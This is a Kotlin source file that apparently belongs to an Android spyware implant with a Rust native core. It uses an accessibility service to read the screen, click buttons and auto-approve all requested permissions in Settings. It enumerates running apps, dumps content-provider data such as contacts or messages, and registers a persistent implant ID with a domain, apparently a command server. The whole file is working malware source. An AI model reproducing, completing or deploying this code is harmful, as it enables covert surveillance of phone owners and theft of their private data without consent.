package com.shadow

import android.content.Context
import android.util.Log
import java.util.UUID

/**
 * Kotlin-side implementation of the primitives the Rust core shells out to.
 * Each function is invoked from Rust via JNI (see core/src/android_bridge.rs).
 * Everything here runs in-process with the implant's own UID — no root, no Shizuku.
 */
object ShadowBridge {
    private const val TAG = "ShadowBridge"

    /** Read screen as a text tree (a11y). */
    fun dumpScreen(): String =
        com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen() ?: "a11y not active"

    /** Click a node by visible text / content description (a11y). */
    fun clickByText(needle: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickByText(needle) ?: false

    /** Click a node by resource id (a11y). */
    fun clickNodeById(viewId: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickNodeById(viewId) ?: false

    /** Open Settings → app permissions and auto-click Allow for all declared perms. */
    fun startAutoGrant(): String {
        val svc = com.shadow.a11y.ShadowAccessibilityService.instance
            ?: return "a11y not active — cannot auto-grant"
        svc.startAutoGrant()
        return "auto-grant started"
    }

    /** List permissions actually granted to this app (PackageManager, own UID). */
    fun grantedPermissions(ctx: Context): String {
        return try {
            val pkg = ctx.packageName
            val pm = ctx.packageManager
            val info = pm.getPackageInfo(pkg, android.content.pm.PackageManager.GET_PERMISSIONS)
            val requested = info.requestedPermissions ?: emptyArray()
            val out = StringBuilder()
            for (p in requested) {
                val ok = pm.checkPermission(p, pkg) == android.content.pm.PackageManager.PERMISSION_GRANTED
                out.append(if (ok) "GRANTED " else "DENIED  ").append(p).append('\n')
            }
            out.toString()
        } catch (e: Throwable) {
            "grantedPermissions error: ${e.message}"
        }
    }

    /** Recents dump — "all the rest of the buttons" fodder. */
    fun runningApps(ctx: Context): String {
        return try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val procs = am.runningAppProcesses ?: emptyList()
            procs.joinToString("\n") { "${it.processName} (pid=${it.pid})" }
        } catch (e: Throwable) {
            "runningApps error: ${e.message}"
        }
    }

    /**
     * Read a content:// provider with our OWN UID. No shell, no root.
     * Works once the matching runtime permission is granted (see startAutoGrant).
     */
    fun queryProvider(uri: String, projection: String, limit: Int): String {
        val ctx = ShadowCore.appContext ?: return "no context"
        return try {
            val proj = if (projection.isBlank()) null else projection.split(",").toTypedArray()
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse(uri), proj, null, null, null
            ) ?: return "provider returned null (uri=$uri)"

            val sb = StringBuilder()
            val cols = cursor.columnNames
            sb.append(cols.joinToString("\t")).append('\n')
            var n = 0
            while (cursor.moveToNext() && n < limit) {
                val row = cols.map { c ->
                    val i = cursor.getColumnIndex(c)
                    if (i < 0) "" else (cursor.getString(i) ?: "")
                }
                sb.append(row.joinToString("\t")).append('\n')
                n++
            }
            cursor.close()
            if (n == 0) "empty: $uri" else "rows=$n\n$sb"
        } catch (e: SecurityException) {
            "permission denied for $uri — run auto-grant first (${e.message})"
        } catch (e: Throwable) {
            "queryProvider error: ${e.message}"
        }
    }
}

object ShadowCore {
    private const val TAG = "ShadowCore"

    /** Context stashed at start() so JNI callbacks can reach PackageManager etc. */
    @Volatile
    var appContext: Context? = null
        private set

    init {
        try {
            System.loadLibrary("shadow")
        } catch (e: Throwable) {
            // UnsatisfiedLinkError is an Error, not Exception — must not kill the process
            Log.e(TAG, "Failed to load libshadow.so", e)
        }
    }

    // Native functions — keep externals private; public wrappers never throw
    private external fun nativeInit(domain: String, implantId: String): Int
    private external fun nativeLogEvent(entry: String)

    fun logEvent(entry: String) {
        try {
            nativeLogEvent(entry)
        } catch (e: Throwable) {
            Log.e(TAG, "logEvent unavailable", e)
        }
    }

    fun start(context: Context, domain: String) {
        appContext = context.applicationContext

        val prefs = context.getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
        var implantId = prefs.getString("implant_id", null)

        if (implantId == null) {
            implantId = UUID.randomUUID().toString()
            prefs.edit().putString("implant_id", implantId).apply()
        }

        Log.i(TAG, "Starting ShadowCore... ID: $implantId")
        try {
            val res = nativeInit(domain, implantId)
            if (res != 0) {
                Log.e(TAG, "nativeInit failed with code $res")
            }
        } catch (e: Throwable) {
            Log.e(TAG, "nativeInit unavailable (native lib missing?)", e)
        }
    }
}